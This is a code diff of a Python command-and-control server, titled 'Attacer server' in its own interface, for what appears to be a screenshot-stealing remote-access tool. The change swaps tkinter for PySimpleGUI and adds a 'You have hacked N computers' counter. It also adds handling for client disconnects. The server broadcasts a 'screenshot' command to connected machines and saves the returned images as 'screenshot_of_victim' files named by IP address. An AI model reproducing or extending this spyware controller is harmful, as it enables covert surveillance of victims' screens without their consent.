@@ -1,4 +1,5 @@
-from tkinter import *
+# from tkinter import *
+import PySimpleGUI as sg
 import socket
 import threading
 import subprocess
@@ -8,31 +9,26 @@ from datetime import datetime
 messages_queue = Queue()
 
 class GUI:
+    window = None
+
     def __init__(self):
-        # chat window which is currently hidden
-        self.Window = Tk()
-        self.Window.withdraw()
+        layout = [[sg.Text("What's your name?")],
+                  [sg.Text(size=(40,10), key='-TITLE-')],  # Part 2 - The Layout
+                  [sg.Button('Take a screenshot')]]
 
-        # login window
-        self.login = Toplevel()
-        # set the title
-        self.login.title("Login")
-        self.login.resizable(width=False,
-                             height=False)
-        self.login.configure(width=400,
-                             height=300)
+        GUI.window = sg.Window('Attacer server', layout, finalize=True)
+        GUI.window['-TITLE-'].update("You have hacked 0 computers")
+        while True:
+            event, values = GUI.window.read()
 
-        # create a Continue Button
-        # along with action
-        self.go = Button(self.login,
-                         text="Take screenshot",
-                         font="Helvetica 14 bold",
-                         command=lambda: self.take_screenshot())
+            if event == sg.WINDOW_CLOSED or event == 'Quit':
+                break
 
-        self.go.place(relx=0.4,
-                      rely=0.55)
+        GUI.window.close()
 
-        self.Window.mainloop()
+    @staticmethod
+    def update_hacked_num(x):
+        GUI.window['-TITLE-'].update("You have hacked " + str(x) + " computers")
 
     def take_screenshot(self):
         messages_queue.put('screenshot')
@@ -49,6 +45,7 @@ class Server:
         address = (server_ip, port)
 
         self.clients = []  # list of all clients
+        self.connected_clients = 0
 
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.bind(address)
@@ -65,28 +62,49 @@ class Server:
             conn, addr = server.accept()
             conn.send("NAME".encode("utf-8"))
             self.clients.append(conn)
+            self.connected_clients += 1
+
+            GUI.update_hacked_num(self.connected_clients)
 
             # create new thread for that client
             thread = threading.Thread(target=self.handler,
                                       args=(conn, addr))
             thread.start()
 
-    def handler(self,conn, addr):
+    def handler(self, conn, addr):
         print(f"Connected to new client with address {addr}")
-        connected = True
 
-        while connected:
+        while True:
+            if self.is_socket_closed(conn):
+                break
             message = conn.recv(1024)
             if message:
                 now = datetime.now()
-                f = open('screenshots/screenshot_of_victim_'+str(addr[0])+'-'+str(addr[1])+'_'+str(now.strftime("%Y%m%d_%H-%M-%S"))+'.png', 'wb')
+                f = open('screenshots/screenshot_of_victim_' + str(addr[0]) + '-' + str(addr[1]) + '_' + str(
+                    now.strftime("%Y%m%d_%H-%M-%S")) + '.png', 'wb')
                 while len(message) == 1024:
                     f.write(message)
                     message = conn.recv(1024)
                 print("receiving finished")
                 f.close()
-
+        print(f"Client with address {addr} disconnected")
+        self.connected_clients -= 1
+        GUI.update_hacked_num(self.connected_clients)
         conn.close()
+
+    def is_socket_closed(self,sock):
+        try:
+            # this will try to read bytes without blocking and also without removing them from buffer (peek only)
+            data = sock.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
+            if len(data) == 0:
+                return True
+        except BlockingIOError:
+            return False  # socket is open and reading from it would block
+        except ConnectionResetError:
+            return True  # socket was closed for some other reason
+        except Exception as e:
+            return False
+        return False
 
     def messaes_handler(self):
         for msg in iter(messages_queue.get, 'STOP'):
@@ -95,7 +113,6 @@ class Server:
     def send_message(self, message):
         for client in self.clients:
             client.send(str.encode(message))
-
 
 
 # New thread for server
